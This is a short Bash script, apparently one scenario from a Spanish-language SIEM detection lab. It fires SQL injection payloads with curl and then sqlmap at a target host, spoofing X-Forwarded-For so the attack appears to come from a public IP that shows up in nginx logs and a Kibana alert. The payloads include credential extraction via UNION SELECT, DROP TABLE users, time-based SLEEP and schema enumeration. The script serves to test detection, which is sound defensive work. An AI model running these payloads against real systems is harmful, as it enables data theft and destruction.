#!/usr/bin/env bash
# Escenario 3: inyección SQL que queda en el access.log de nginx.
# La víctima está "detrás de un balanceador": X-Forwarded-For trae la IP pública del atacante,
# así GeoIP la ubica en el mapa (las IPs de Docker son privadas).
set -u
IP_PUBLICA="${IP_PUBLICA:-185.220.101.34}"
BASE="http://${OBJETIVO}"
H="X-Forwarded-For: ${IP_PUBLICA}"
echo "== [$(date -u +%T)] Inyección SQL contra ${BASE} (XFF ${IP_PUBLICA})"

for carga in \
  "1'%20OR%20'1'='1" \
  "1%20UNION%20SELECT%20username,password%20FROM%20users--" \
  "1;%20DROP%20TABLE%20users;--" \
  "1%20AND%20SLEEP(5)" \
  "1'%20UNION%20ALL%20SELECT%20NULL,table_name%20FROM%20information_schema.tables--"; do
  curl -s -o /dev/null -w "%{http_code}  /buscar?q=${carga}\n" -H "$H" "${BASE}/buscar?q=${carga}"
done

sqlmap -u "${BASE}/producto?id=1" --headers="$H" --batch --level=1 --risk=1 \
  --technique=BU --threads=2 --flush-session -v 0 || true
echo "== [$(date -u +%T)] Fin. En Kibana: Security -> Alerts -> 'SIEM - Inyección SQL'"
